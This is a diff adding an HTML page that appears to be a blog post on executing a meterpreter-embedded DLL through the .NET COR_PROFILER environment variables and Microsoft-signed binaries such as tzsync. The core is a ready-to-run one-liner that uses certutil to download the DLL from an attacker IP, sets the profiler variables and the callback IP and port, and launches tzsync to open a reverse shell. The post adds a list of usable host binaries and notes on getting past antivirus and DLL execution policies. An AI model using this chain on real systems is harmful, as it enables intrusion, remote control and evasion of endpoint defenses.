@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>COR_PROFILE Execution</title>
+</head><body>Now we need to create a DLL with the format required by the CLR (we're not going to explain this now). Wint3r did a good job creating a compatible DLL with a meterpreter embedded.<ul><li>The DLL needs to be created in unmanaged code.</li>
+</ul>
+<ul>To load the profiler we need a binary using .NET like the following:</ul>
+<ul><li style="list-style-type: none"><ul><li>powershell.exe</li>
+<li>tzsync.exe</li>
+<li>AppVStreamingUX.exe</li>
+<li>UevTemplateBaselineGenerator.exe</li>
+<li>UevAgentPolicyGenerator.exe</li>
+<li>stordiag.exe</li>
+<li>FileHistory.exe</li>
+<li>UevAppMonitor.exe</li>
+<li>Microsoft.Uev.SyncController.exe</li>
+<li>powershell_ise.exe</li>
+<li>... </li>
+</ul>
+</li>
+<li>It's possible to execute managed code using COMs Interop or another DLL. </li>
+<li>To make all of this work you need to set every COR related enviroment variable (this don't need any special privileges).</li>
+<li>In our tests we didn't have any problem with AVs (Windows Defender, Avast or Cylance) but the DLL got uploaded to VirusTotal and shared in the Telegram group "HackTheBox Hispano" so probably now some AVs may detect it as malware.</li>
+</ul>
+<br/>
+&nbsp;<br/>
+certutil -urlcache -split -f http://10.10.14.30/Beryllium.dll C:\programdata\winter.dll &amp;&amp; set "COR_ENABLE_PROFILING=1" &amp;&amp; set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}" &amp;&amp; set "COR_PROFILER_PATH=C:\programdata\winter.dll" &amp;&amp; set "IP=10.10.14.30" &amp;&amp; set "PORT=443" &amp;&amp; tzsync<br/>
+<br/>
+<div style="text-align: left"><span style="font-family: verdana">The oneliner does the following:</span></div><ul><li>With certutil, we upload the DLL to C:\ProgramData\</li>
+<li>We set the profiler env vars.</li>
+<li>We set IP and PORT to get our reverse meterpreter.</li>
+<li>Finally, we execute a binary that creates a managed process --&gt; tzsync.</li>
+</ul>
+&nbsp;<br/>
+And.. Voila!!<br/>
+<br/>
+Through this technique we have managed to take advantage of system binaries signed by Microsoft (for example, tzsync) that will rarely be blocked to execute a DLL in its context.<br/>
+<br/>
+Note that depending on the type of policies that are applied to the execution of DLLs, the more restrictives may block the execution of our DLL. In these cases it will be necessary to check (trial and error) directories within zones such as C:\Windows or the Program Files in order succeed.</body></html>
